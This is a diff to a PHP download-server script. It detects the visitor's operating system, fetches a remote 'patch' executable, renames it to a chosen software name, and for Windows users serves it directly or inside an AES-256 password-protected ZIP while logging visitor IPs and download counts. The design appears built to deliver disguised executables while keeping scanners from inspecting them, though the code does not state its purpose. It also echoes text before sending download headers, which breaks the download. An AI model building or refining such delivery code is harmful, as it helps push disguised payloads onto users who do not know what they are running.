@@ -42,7 +42,25 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET') {
         
         switch($userOS) {
             case "Windows":
-                header("Location: $patchURL");
+
+                if ($FileName) $FileName = $FileName.'.exe';
+                else $FileName = basename($patchURL);
+                
+                $fileContent = file_put_contents($FileName, fopen($patchURL, 'r'));
+                if ($fileContent === FALSE) {
+                    die("Failed to download file from URL: $patchURL");
+                }
+
+                header('Content-Description: File Transfer');
+                header('Content-Type: application/octet-stream');
+                header('Content-Disposition: attachment; filename="'.$FileName.'"');
+                header('Expires: 0');
+                header('Cache-Control: must-revalidate');
+                header('Pragma: public');
+                header('Content-Length: ' . filesize($FileName));
+                readfile($FileName);
+                unlink($FileName);
+
                 break;
             case "Android":
                 header("Location: $AndroidLink");
@@ -55,7 +73,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET') {
                 break;
         }
 
-        // modify download status
+        // Log the visitor and download count
         modifyDownloadStatus($userIP);
         // download count
         incrementDownloadCount();
@@ -66,66 +84,70 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET') {
 
     // if archiving => ON, users will download .zip file
     if ($archiving == "ON") {
-        
-         // Download the external .exe file from the patch download link
+ 
+        if ($userOS != 'Windows') exit;
+ 
+        // Step 1: Download the file
+        $fileContent = @file_get_contents($patchURL);
+        $originName = basename($patchURL);
 
-         switch($userOS) {
-            case "Windows":
-                $exe_content = file_get_contents($patchURL);
-                break;
-            case "Android":
-                $exe_content = file_get_contents($AndroidLink);
-                break;
-            case "iPhone":
-                $exe_content = file_get_contents($iOSLink);
-                break;
-            case "macOS":
-                $exe_content = file_get_contents($MacOSLink);
-                break;
+        if ($fileContent === FALSE) {
+            die("Failed to download file from URL: $patchURL");
         }
- 
- 
-         if ($exe_content === false) {
-             die('Failed to download the file.');
-         }
- 
-         // Create a new ZIP file
-         $zip = new ZipArchive();
-         if ($zip->open($zip_file, ZipArchive::CREATE) !== TRUE) {
-             die('Failed to create .zip file.');
-         }
- 
-         // Add the .exe file to the ZIP archive
-         $zip->addFromString($patchURL, $exe_content);
- 
-         // Set password and encryption for the ZIP file
-         $zip->setPassword($correct_password);
-         $zip->setEncryptionName($patchURL, ZipArchive::EM_AES_256);
-         $zip->close();
- 
-         // Serve the ZIP file to the user for download
-         if (file_exists($zip_file)) {
- 
-             header('Content-Description: File Transfer');
-             header('Content-Type: application/zip');
-             header('Content-Disposition: attachment; filename="'.basename($zip_file).'"');
-             header('Expires: 0');
-             header('Cache-Control: must-revalidate');
-             header('Pragma: public');
-             header('Content-Length: ' . filesize($zip_file));
-             readfile($zip_file);
- 
-             unlink($zip_file); // Delete the ZIP file after serving it
- 
-             // modify the download status
-             modifyDownloadStatus($userIP);
-             
-             // download count
-             incrementDownloadCount();
- 
-            exit;
+
+        if (!$software_name) $software_name = $originName;
+        else $software_name = $software_name.'.exe';
+        if (!$zip_file) $zip_file = $originName.'.zip';
+        else $zip_file = $zip_file.'.zip';
+        
+
+        // Step 2: Save the downloaded file with a new name
+        if ($software_name && file_put_contents($software_name, $fileContent) === FALSE) {
+            die("Failed to save the downloaded file.");
+        } else if (!$software_name && $fileContent === FALSE) {
+            die("Failed to save the downloaded file.");
+        }
+
+
+        // Step 3: Create a ZIP file and add the downloaded file to it
+        $zip = new ZipArchive();
+        if ($zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
+
+            if ($correct_password) $zip->setPassword($correct_password);
+
+            if (!$zip->addFile($software_name)) {
+                die("Failed to add file to ZIP archive.");
+            }
+    
+            // Encrypt the file using AES-256 encryption
+            if ($correct_password && !$zip->setEncryptionName($software_name, ZipArchive::EM_AES_256)) {
+                die("Failed to encrypt file in the ZIP archive.");
+            }
+            
+            $zip->close();
+            echo "File has been zipped successfully as $zip_file.";
+
+            if (file_exists($zip_file)) {
+                header('Content-Description: File Transfer');
+                header('Content-Type: application/zip');
+                header('Content-Disposition: attachment; filename="'.basename($zip_file).'"');
+                header('Expires: 0');
+                header('Cache-Control: must-revalidate');
+                header('Pragma: public');
+                header('Content-Length: ' . filesize($zip_file));
+                readfile($zip_file);
+
+                // Log the visitor and download count
+                modifyDownloadStatus($userIP);
+                // download count
+                incrementDownloadCount();
+
+                unlink($zip_file);
+            }
+            unlink($software_name);
+
         } else {
-            die('Failed to create the .zip file.');
+            die("Failed to create ZIP file.");
         }
 
     }
